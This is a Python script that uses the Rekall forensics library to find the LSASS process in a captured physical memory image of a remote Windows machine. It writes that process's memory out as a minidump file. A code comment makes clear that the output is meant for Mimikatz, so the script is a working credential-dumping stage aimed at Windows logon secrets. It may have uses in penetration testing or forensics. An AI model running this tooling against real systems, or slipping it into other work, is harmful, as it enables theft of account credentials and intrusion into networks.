#!/usr/bin/env python3

import logging
# Setup logging as required. Rekall will log to the standard logging service.
logging.basicConfig(level=logging.CRITICAL)
from rekall import session
from rekall import plugins
from fsminidump.minidump import Minidump
import sys
from binascii import hexlify, unhexlify
import json
import datetime
import time
import os

## Get system info.
#
# @param s rekall session.
# @param build, build version retrived without using rekall.
def read_systeminfo(s, build):
    major = int(s.profile.metadata('major'))
    minor = int(s.profile.metadata('minor'))
    arch = s.profile.metadata('arch')

    # The keys should match fsminidump
    return dict(MajorVersion=major, MinorVersion=minor, BuildNumber=build)

## Read memory info of process.
#
# @param s rekall session.
# @param pid pid of process to read.
def read_memoryinfo(s, pid):
    #MEM_IMAGE = 0x1000000
    MEM_MAPPED = 0x40000
    MEM_PRIVATE = 0x20000

    memoryinfo_list = []
    for d in s.plugins.vaddump(pids=[pid]).collect():
        if 'start' not in d:
            continue

        mi = dict(
            BaseAddress=d['start'].value,
            AllocationBase=0,
            AllocationProtect=int(d['protect'].value),
            RegionSize=d['end'].value-d['start'].value+1,
            Protect=int(d['protect'].value))

        # TODO: Somehow identify MEM_IMAGE
        if d['type'] == 'Mapped':
            mi['Type'] = MEM_MAPPED
        elif d['type'] == 'Private':
            mi['Type'] = MEM_PRIVATE
        else:
            mi['Type'] = 0

        # TODO: Figure out how to get the state...
        mi['State'] = 0

        memoryinfo_list.append(mi)

    return memoryinfo_list

# TODO: For some reason the output of memdump plugin does not match vaddump
# The Right Stuff is there but the virtual address seems to be wrong and therefore Mimikatz doesn't find it
def read_memory64_memdump(s):
    pslist = s.plugins.pslist(proc_regex='lsass.exe')
    task = next(pslist.filter_processes())
    addr_space = task.get_process_address_space() 

    max_memory = s.GetParameter("highest_usermode_address")
    total = 0
    memory64_list = []
    for run in addr_space.get_address_ranges(end=max_memory):
        size = run.end - run.start
        total += size
        data = addr_space.read(run.start, size)
        #if data.find(b'\x33\xff\x45\x89\x37\x48\x8b\xf3\x45\x85\xc9\x74') != -1:
        #    print("Found in", hex(run.start), hex(run.end), size)
        memory64_list.append((run.start, size, data))

    return memory64_list

## Read memory of process.
#
# @param s rekall session.
# @param pid pid of process to read.
def read_memory64(s, pid):
    pslist = s.plugins.pslist(proc_regex='lsass.exe')
    task = next(pslist.filter_processes())
    addr_space = task.get_process_address_space()

    memory64_list = []
    for d in s.plugins.vaddump(pids=[pid]).collect():
        if 'start' not in d:
            continue

        start = d['start'].value
        size = d['end'].value-d['start'].value+1
        #print(hex(start), size)

        # TODO: This is a hack that vaddump uses too (with 100 MB limit)
        if size > 100*1024*1024:
            #print("Skipping memory range", hex(start), size)
            continue

        data = addr_space.read(start, size)
        memory64_list.append((start, size, data))

    return memory64_list


## Read list of modules.
#
# @param s rekall session.
# @param pid pid of process to read.
def read_modulelist(s, pid):
    module_list = []
    for dll in s.plugins.dlllist(pids=[pid]).collect():
        if 'dll_path' in dll and len(dll['dll_path'].v()) > 1:
            module_list.append((dll['dll_path'].v(), dll['base'].v(), dll['size'].v()))
    return module_list

## Check ten times if file was created by other process, wait 1s on each check.
#
# @param path path to file.
# @exceptions Exception if file does not exist.
def ensureFileExist(path):
    for x in range(10):
        if(os.path.exists(path)):
            break
        time.sleep(1)
    else:
        raise Exception('File does not exist: ' + path)

## Main function of module.
#
# Reads file with remote machine memory, and starts rekall session on it.
# Creates LSASS process memory dump.
# @param label created memory dump will be stored as 'output/label-date-lsass.dmp'
def dump(label):
    CONFIG_FILE = 'config.json'
    print("[*] Loading config from %s" % (CONFIG_FILE))
    ensureFileExist(CONFIG_FILE)
    with open(CONFIG_FILE) as f:
        config = json.load(f)

    ensureFileExist(config['image'])
    print("[*] Analyzing physical memory")

    s = session.Session(
        filename=config['image'],
        autodetect=["rsds"],
        logger=logging.getLogger(),
        cache = "timed",
        cache_dir = ".rekall_cache",
        repository_path = ['https://github.com/google/rekall-profiles/raw/master', 'http://profiles.rekall-forensic.com'],
        autodetect_build_local = "basic",
        dtb=(config['dtb'] if 'dtb' in config else None),
        kernel_base=(config['kernel_base'] if 'kernel_base' in config else None),
    )

    print("[*] Finding LSASS process")

    lsass_pid = None
    for row in s.plugins.pslist().collect():
        if str(row['_EPROCESS'].name).lower() == "lsass.exe":
            lsass_pid = row['_EPROCESS'].pid
            break
    else:
        print("No LSASS found")
        sys.exit(1)

    print("[*] LSASS found")

    minidump = Minidump()

    build = 0
    if 'build' in config:
        build = int(config['build'])
    else:
        print("Config did not include Windows build number, collecting it from imageinfo plugin")
        imageinfo = s.plugins.imageinfo().collect()
        for x in imageinfo:
            if 'key' in x and x['key'] == 'NT Build':
                build = int(str(x['value']).split('.')[0])
                break

    print("[*] Collecting data for minidump: system info")
    systeminfo = read_systeminfo(s, build)
    print("[*] Collecting data for minidump: memory info")
    memoryinfo_list = read_memoryinfo(s, lsass_pid)
    print("[*] Collecting data for minidump: memory content")
    memory64_list = read_memory64(s, lsass_pid)
    print("[*] Collecting data for minidump: module info")
    module_list = read_modulelist(s, lsass_pid)

    print("[*] Generating the minidump file")
    minidump.set_systeminfo(systeminfo)
    minidump.set_memoryinfo_list(memoryinfo_list)
    minidump.set_memory64(memory64_list)
    minidump.set_module_list(module_list)

    data = minidump.build()

    if (not os.path.exists('output')):
        os.mkdir('output')

    filepath = 'output/%s-%s-lsass.dmp' % (label, datetime.datetime.now().strftime("%Y-%m-%d"))
    with open(filepath, 'wb') as f:
        f.write(data)

    print("[*] Wrote LSASS minidump to %s" % (filepath))